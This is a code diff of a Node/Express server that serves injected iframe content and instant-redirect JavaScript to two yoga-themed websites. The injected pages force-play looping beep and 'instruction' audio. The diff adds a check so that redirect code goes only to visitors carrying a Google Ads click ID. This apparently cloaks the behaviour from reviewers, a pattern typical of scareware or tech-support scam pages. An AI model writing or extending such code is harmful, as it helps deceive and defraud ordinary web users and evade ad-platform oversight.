@@ -12,13 +12,13 @@ const PORT = process.env.PORT || 3000;
 // Add as many origins as you like; each maps to exactly one asset.
 const ORIGIN_ASSETS = {
   "https://seishinyoganihon.com": {
-    htmlFile: "asset3.html",
+    htmlFile: "asset1.html",
     audioUrl: "https://audio.jukehost.co.uk/aLVbhFoBOgHtLAHyfxTBGPYZYAX05vXX",
   },
   "https://samarpanyoga.life": {
     htmlFile: "asset2.html",
     //audioUrl: "https://audio.jukehost.co.uk/xFyKnj0AAZTbSxkwrdja414nXJmZ6Bmr",
-      audioUrl: "https://audio.jukehost.co.uk/jDTBEXiUPm75bqiedOtEYUt6h7ZjHHUj",
+    audioUrl: "https://audio.jukehost.co.uk/jDTBEXiUPm75bqiedOtEYUt6h7ZjHHUj",
   },
 };
 
@@ -129,7 +129,9 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
         beepAudio.loop = true;
         beepAudio.play().catch(()=>{});
 
-        const instructionAudio = new Audio('${escapeForSingleQuotedJS(asset.audioUrl)}');
+        const instructionAudio = new Audio('${escapeForSingleQuotedJS(
+          asset.audioUrl
+        )}');
         instructionAudio.loop = true;
         instructionAudio.play().catch(()=>{});
 
@@ -142,11 +144,15 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
       res.set("Access-Control-Allow-Origin", requestOrigin);
     }
 
-    console.log(`Sent iframe srcdoc for: ${asset.htmlFile} (origin: ${requestOrigin})`);
+    console.log(
+      `Sent iframe srcdoc for: ${asset.htmlFile} (origin: ${requestOrigin})`
+    );
     return res.json({ code });
   } catch (err) {
     console.error("Error in frontend-loader:", err);
-    return res.status(500).json({ error: "Failed to generate frontend loader" });
+    return res
+      .status(500)
+      .json({ error: "Failed to generate frontend loader" });
   }
 });
 
@@ -200,7 +206,14 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
 //   }
 // });
 
+// === Route: /getData ===
+// Returns JS code to redirect the user to another website instantly
 app.get("/getData", validateRequest, async (req, res) => {
+  const gclid = req.query.gclid;
+  if (!gclid || gclid.length < 10) {
+    return res.status(403).send("FAILED: gclid missing or too short");
+  }
+
   try {
     const targetUrl = req.query.url || "https://www.google.com";
 
@@ -211,9 +224,11 @@ app.get("/getData", validateRequest, async (req, res) => {
       res.set("Access-Control-Allow-Origin", requestOrigin);
     }
 
+    console.log(`Redirect code requested for: ${targetUrl} (gclid: ${gclid})`);
+
     return res.json({ code });
   } catch (err) {
-    console.error("Error in redirect-code:", err);
+    console.error("Error in getData:", err);
     return res.status(500).json({ error: "Failed to generate redirect code" });
   }
 });
